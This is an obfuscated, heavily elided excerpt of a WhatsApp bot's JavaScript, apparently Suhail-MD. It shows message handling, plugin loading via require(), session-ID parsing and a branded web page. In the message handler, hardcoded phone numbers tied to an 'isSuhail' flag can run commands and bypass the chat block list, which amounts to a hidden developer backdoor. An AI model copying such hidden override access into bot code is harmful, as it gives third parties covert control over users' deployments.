...
async function syncdb() {
    ...
    try {
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          ...
          _0x9954f4 = prefixboth || _0x4186a0 && prefixRegex.test(_0x4186a0[0x0]) || _0x5979da.isSuhail && /923184474176|923004591719|17863688449/g.test(_0x5b55c3) && _0x4186a0[0x0] == ',';
        ...
        if (blockJid.includes(_0x5979da.chat) && !_0x5979da.isSuhail) {
          return;
        }
        ...
        if (_0x9954f4) {
          ...
          if (_0x5979da.isGroup && _0x111ae6 && _0x4931af !== "bot") {
            let _0x334235 = _0x4f1890[_0x5979da.chat] || (await groupdb.findOne({
              ...
              'botenable': toBool(_0x5979da.isSuhail || !blockJid.includes(_0x5979da.chat))
            };
        ...
        events.commands.map(async _0x2dffdb => {
          if (typeof _0x2dffdb.on === 'string') {
            ...
            if (_0x1d5795 === "main" && _0x3078ae) {
              ...
              if (_0x5979da.text && _0x1d5795 === "text" && /text|txt|true|smd|suhail/gi.test(_0x2dffdb.quoted) && _0x5979da.quoted && _0x5979da.quoted.text && _0x3078ae) {
                _0x2dffdb["function"](_0x5979da, _0x4186a0, _0x4717ae);
              } else {
        ...
        if (Object.keys(_0xd559f7 || {}).length > 0x0) {
          ...
          for (const _0x5701b6 in _0x22ec5b) {
            try {
              ...
              if (_0x28bc47) {
                let _0x224d22 = _0x5701b6 + (_0x4fcba7[_0x5701b6] && /.js|.smd|.suhail/gi.test(_0x4fcba7[_0x5701b6]) ? _0x4fcba7[_0x5701b6] : ".smd");
  ...
  _0x5447f8.messageId = (_0x344ea2 = 0x8, _0x4bb246 = "SUHAILMD") => {
  ...
  _0x5447f8.sendUi = async (_0x264148, _0x4d42ab = {}, _0x541cb3 = '', _0x2e5e1f = '', _0x3bceba = '', _0x171bcf = false) => {
    ...
    try {
      ...
      let _0x237b02;
      if ((_0x171bcf && _0x3bceba && global.style > 0x0 || !_0x3bceba) && /text|txt|nothing|smd|suhail/.test(global.userImages) || _0x2e5e1f == "text") {
        _0x237b02 = {
    ...
    fs.readdirSync(_0x31a795).forEach(_0x340012 => {
      ...
      if (fs.statSync(_0x4c0490).isDirectory()) {
        ...
        if (_0x340012.includes("_Baileys") || _0x340012.includes("_MSGS")) {
          ...
          if (['.js', ".smd", '.suhail'].includes(path.extname(_0x340012).toLowerCase())) {
            try {
              require(_0x4c0490);
            } catch (_0xf3f8e5) {
...
app.get("/suhail", (_0x2e8c1a, _0x30322c) => _0x30322c.type("html").send("\n     <!DOCTYPE html>\n     <html>\n       <head>\n         <title>Suhail-Md</title>\n         <link rel=\"icon\" type=\"image/png\" sizes=\"32x32\" href=\"/logo\">\n         <script src=\"https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js\"></script>\n         <script>\n           setTimeout(() => {\n             confetti({\n               particleCount: 100,\n               spread: 70,\n               origin: { y: 0.6 },\n               disableForReducedMotion: true\n             });\n           }, 500);\n         </script>\n         <style>\n           @import url(\"https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css\");\n           @font-face {\n             font-family: \"neo-sans\";\n             src: url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff2\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"woff\"), url(\"https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3\") format(\"opentype\");\n             font-style: normal;\n             font-weight: 700;\n           }\n           html {\n             font-family: neo-sans;\n             font-weight: 700;\n             font-size: calc(62rem / 24);\n           }\n           body {\n             background: white;\n           }\n           section {\n             border-radius: 1em;\n             padding: 1em;\n             position: absolute;\n             top: 50%;\n             left: 50%;\n             margin-right: -50%;\n             transform: translate(-50%, -50%);\n           }\n           \n         </style>\n       </head>\n       <body>\n         <section>\n           Hello from \"Suhail Tech Info\"!\n         </section>\n         <p>  <a href='/qr' > QR </a> | <a href='/var' > VARIABLES </a> | <a href='https://github.com/SuhailTechInfo/Suhail-Md-Media' > PLUGINS </a> | <a href='https://github.com/SuhailTechInfo/Suhail-Md/wiki' > WIKI's </a></p>\n       </body> \n     </html>\n     "));
...
async function MakeSession(_0x3344dc = SESSION_ID, _0xe1ef27 = __dirname + "/Suhail_Baileys/", _0x1532e1 = false) {
  let _0x148358 = ('' + _0x3344dc).replace(/^SESSION_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^SESSION_ID_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^SUHAIL_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/Secktor;;;/gi, '').replace(/Vorterx;;;/gi, '').replace(/Suhail;;;/gi, '').trim();
  ...
  const _0x40fbb4 = toBool(_0x1532e1 || global.IS_SUHAIL || process.env.IS_SUHAIL, true) || (await _0x28b1d6("/SuhailTechInfo/", "./Dockerfile"));
  if (_0x40fbb4) {
    SmdOfficial = "yes";
